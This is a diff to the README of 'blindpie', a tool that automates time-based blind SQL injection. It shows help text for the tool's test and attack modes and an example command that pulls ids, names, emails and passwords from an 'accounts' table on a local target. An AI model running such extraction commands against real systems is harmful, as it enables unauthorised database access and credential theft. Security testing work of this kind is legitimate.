@@ -13,36 +13,36 @@ It should work fine injecting in SELECT, DELETE, and UPDATE queries. Injections 
 Use the `--help` command to show the help message:
 
 ```
- _     _ _           _       _      
-| |   | (_)         | |     (_)     
-| |__ | |_ _ __   __| |_ __  _  ___
-| '_ \| | | '_ \ / _` | '_ \| |/ _ \
-| |_) | | | | | | (_| | |_) | |  __/
-|_.__/|_|_|_| |_|\__,_| .__/|_|\___|
-                     | |           
-                     |_|           
+  _     _ _           _       _
+ | |   | (_)         | |     (_)
+ | |__ | |_ _ __   __| |_ __  _  ___
+ | '_ \| | | '_ \ / _` | '_ \| |/ _ \
+ | |_) | | | | | | (_| | |_) | |  __/
+ |_.__/|_|_|_| |_|\__,_| .__/|_|\___|
+                       | |
+                       |_|
 
 usage: blindpie.py [-h] -u URL -p PARAMS [PARAMS ...] -d DEFAULT [DEFAULT ...]
-                 (--post | --get) [-M M] [-T T]
-                 {test,attack} ...
+                   (--post | --get) [-M M] [-T T]
+                   {test,attack} ...
 
 A simple tool to automate time-based blind SQL injections.
 
 positional arguments:
-{test,attack}
+  {test,attack}
 
 optional arguments:
--h, --help            show this help message and exit
--u URL, --url URL     url of the target
--p PARAMS [PARAMS ...], --params PARAMS [PARAMS ...]
-                      parameters for the requests
--d DEFAULT [DEFAULT ...], --default DEFAULT [DEFAULT ...]
-                      default values for the parameters
---post                use method POST
---get                 use method GET
--M M                  attack mode (from 0, the least reliable but the
-                      fastest, to 3, the most reliable but the slowest)
--T T                  number of threads to create when getting multiple rows
+  -h, --help            show this help message and exit
+  -u URL, --url URL     url of the target
+  -p PARAMS [PARAMS ...], --params PARAMS [PARAMS ...]
+                        parameters for the requests
+  -d DEFAULT [DEFAULT ...], --default DEFAULT [DEFAULT ...]
+                        default values for the parameters
+  --post                use method POST
+  --get                 use method GET
+  -M M                  attack mode (from 0, the least reliable but the
+                        fastest, to 4, the most reliable but the slowest)
+  -T T                  number of threads to create when getting multiple rows
 
 Note: the default values must be of the same type of data of the parameters
 (use numbers for the parameters which are numbers, strings otherwise).
@@ -99,15 +99,20 @@ This is the help message for the <i>attack mode</i>:
 
 ```
 usage: blindpie.py attack [-h] --param PARAM --table TABLE --column COLUMN
-                          --row ROW [--rows ROWS]
+                          --row ROW [--rows ROWS] [--max_length MAX_LENGTH]
+                          [--min_length MIN_LENGTH]
 
 optional arguments:
-  -h, --help       show this help message and exit
-  --param PARAM    vulnerable parameter to exploit
-  --table TABLE    name of the table from which to select
-  --column COLUMN  name of the column to select
-  --row ROW        index of the row to select
-  --rows ROWS      number of rows to select
+  -h, --help            show this help message and exit
+  --param PARAM         vulnerable parameter to exploit
+  --table TABLE         name of the table from which to select
+  --column COLUMN       name of the column to select
+  --row ROW             index of the row to select
+  --rows ROWS           number of rows to select
+  --max_length MAX_LENGTH
+                        max length of a selected row
+  --min_length MIN_LENGTH
+                        min length of a selected row
 ```
 
 #### Example:
@@ -141,7 +146,7 @@ Zaphod
 [*] all done in 34.583 sec
 ```
 
-Note #1: use the `-M` parameter to set the reliability of the script. The value goes from 0 (the least reliable but the fastest) to 3 (the most reliable but the slowest).
+Note #1: use the `-M` parameter to set the reliability of the script. The value goes from 0 (the least reliable but the fastest) to 4 (the most reliable but the slowest).
 
 Note #2: use the `-T` parameter to set the number of rows to extract concurrently. <strong>Multithreading is suggested during local analysis only. It seems to be less reliable for non local targets.</strong>
 
@@ -149,7 +154,7 @@ The script will test each character of each row and will print the rows found.
 
 ### Trick
 
-You can extract multiple columns at a time by concatenating the values. Use the `concat` function as the column name:
+You can extract multiple columns at once by concatenating the values. Use the `concat` function when specifying the column name:
 
 ```
 $ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind.php -p email -d email@ddress.com --get -M0 -T10 attack --table accounts --column "concat(id, char(32), first_name, char(32), last_name, char(32), email, char(32), password)" --param email --row 0 --rows 10
